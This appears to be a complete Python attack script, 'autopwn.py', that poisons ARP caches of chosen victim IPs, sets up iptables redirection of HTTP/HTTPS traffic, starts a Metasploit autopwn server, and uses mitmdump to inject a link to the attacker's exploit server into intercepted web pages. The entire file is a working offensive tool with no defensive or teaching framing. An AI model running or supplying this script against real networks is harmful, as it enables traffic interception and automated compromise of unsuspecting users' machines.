#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
#from scapy.all import *
from termcolor import colored
import netifaces

# print usage 
if len(sys.argv) !=4:
    print (" Usage: python3 autopwn.py <IPs separated with commas> <gateway IP> <interface>")
    exit()

targets = sys.argv[1].split(',') # split targets
gateway = sys.argv[2]
iface = sys.argv[3]

# enable forwarding 
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A POSTROUTING -o "+iface+" -j MASQUERADE")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")

# run the arpspoof for each victim
for target in targets:
    #os.system("xterm -e arpspoof -i "+iface+" -t " + target + " " + gateway + " &")	# if you prefer to use arpspoof from dsniff, each victim in one terminal
    #os.system("xterm -e arpspoof -i "+iface+" -t " + gateway + " " + target + " &")
    os.system("cd modules;xterm -e 'python3 arp.py -t "+target+" -g "+gateway+"' &")	# python module for arppoison

# Start the metasploit autopwn server
os.system("xterm -hold -e 'python3 os_msf.py' &")

interfaces = netifaces.interfaces()

for i in interfaces:
	if i == 'lo':
		continue

	iface = netifaces.ifaddresses(i).get(netifaces.AF_INET)
	if iface != None:
		for j in iface:
			ip = j['addr']

# start the mitmproxy injection
os.system("/usr/bin/mitmdump -s 'injector.py http://"+ip+":10000' -T")
